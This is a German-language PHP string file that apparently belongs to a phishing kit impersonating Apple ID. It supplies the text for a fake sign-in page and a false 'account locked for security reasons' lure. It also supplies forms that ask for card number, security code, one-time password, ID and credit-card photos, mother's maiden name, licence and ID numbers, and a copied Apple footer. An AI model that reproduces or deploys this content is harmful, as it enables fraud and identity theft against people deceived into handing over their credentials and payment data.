<?php



###############Homepage##########
$_LANG['SIGNIN'] = "Einloggen";
$_LANG['SIGNUP'] = "Apple&nbsp;ID&nbsp;erstellen&nbsp;";
$_LANG['FORGOT'] = "Apple‑ID&nbsp;oder&nbsp;Passwort&nbsp;vergessen?&nbsp;";
$_LANG['TITLE'] = "Dein Account für alles von Apple";
$_LANG['TITLE2'] = "Mit einer Apple‑ID und einem Passwort hast du Zugriff auf alle Dienste von Apple.";
$_LANG['TITLE3'] = "Weitere Informationen zur&nbsp;Apple&nbsp;ID&nbsp;";
###############Signin############
$_LANG['MANAGE'] = "Verwalte deinen Apple‑Account";
$_LANG['PASS'] = "Passwort";
$_LANG['WRONG'] = "Deine Apple&nbsp;ID oder dein Passwort ist falsch.";
$_LANG['FORGOT'] = "Passwort vergessen?";
$_LANG['REMMBR'] = "Apple-ID merken ";
$_LANG['PLCHDR'] = "Apple ID";
###############SLEKEK############
$_LANG['REASON'] = "Diese Apple ID wurde aus Sicherheitsgründen gesperrt.";
$_LANG['REASON2'] = "Sie müssen Ihr Konto vor der Anmeldung entsperren.";
$_LANG['UNLOCKACC'] = "Konto entsperren";
$_LANG['DASHBD'] = "Bestätigung des Kontos";
$_LANG['URAPPL'] = "Ihre Apple ID ist";
$_LANG['SIGNOUT'] = "Ausloggen";
$_LANG['WAIT'] = "Bitte warten Sie, während wir Ihren Kontozugriff wiederherstellen ...";
$_LANG['PROVIDE'] = "Bitte geben Sie ein Foto Ihres Ausweises und Ihrer Kreditkarte an.";
$_LANG['FORYOUR'] = "Zu Ihrer Sicherheit werden Sie automatisch ausgeloggt.";
$_LANG['CONFIRM']= "Bestätige deine Identität";
###############FORM##############
$_LANG['PERSON'] = "Persönliche Angaben";
$_LANG['NAME'] = "Name";
$_LANG['FN'] = "Vorname";
$_LANG['MN'] = "Zweitname (optional)";
$_LANG['LN'] = "Familienname, Nachname";
$_LANG['DOB'] = "Geburtsdatum";
$_LANG['PHONE'] = "Telefon";
$_LANG['PHONENUMB'] = "Telefonnummer";
$_LANG['ADDRESS'] = "Adresszeile";
$_LANG['CITY'] = "Stadt / Ort";
$_LANG['POSTCODE'] = 'Postleitzahl';
$_LANG['COUNTRY'] = "$nama_negara";
$_LANG['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="Staat / Provinz">
</div>
</div>
';
###############ACCDETAILS#######
$_LANG['ACCDET'] = "Kontodetails";
$_LANG['CARDDET'] = "KARTENDETAILS";
$_LANG['CARDHOLD'] = "Name des Karteninhabers";
$_LANG['CARDNUM'] = "Kartennummer";
$_LANG['CARDEXP'] = "Ablaufdatum";
$_LANG['CARDCSC'] = "Karten-Sicherheitscode";
$_LANG['CARDOTP'] = "Einmaliges Passwort";
###############SECURITY#########
$_LANG['SECURITY'] = "Sicherheit";
$_LANG['QUESSELC'] = "WÄHLE EINE SICHERHEITSFRAGE";
$_LANG['MTHRMDN'] = "Mädchenname der Mutter";
$_LANG['DRVRLCNS'] = "Führerscheinnummer";
$_LANG['PASSPRT'] = "Ausweisnummer";
$_LANG['ANSWR'] = "Antworten";
$_LANG['NEXT'] = "Nächster";
$_LANG['FINISH'] = "Fertig";
##############FOOTER############
$_LANG['FOOTERLINE1'] = "Besuchen Sie einen  <a href='#'>Apple Store</a> (0800 048 0408), oder bei einem <a href='#'>Händler</a> in deiner Nähe.";
$_LANG['FOOTERLINE21'] = "Apple Information.";
$_LANG['FOOTERLINE22'] = "Site Map";
$_LANG['FOOTERLINE23'] = "Hot News";
$_LANG['FOOTERLINE24'] = "RSS Feeds";
$_LANG['FOOTERLINE25'] = "Contact Us";
$_LANG['COPYR'] = "Copyright © 2017 Apple Inc. All rights reserved.";
$_LANG['TERMCN'] = "Terms of use";
$_LANG['PRVPLCY'] = "Privacy Policy";
?>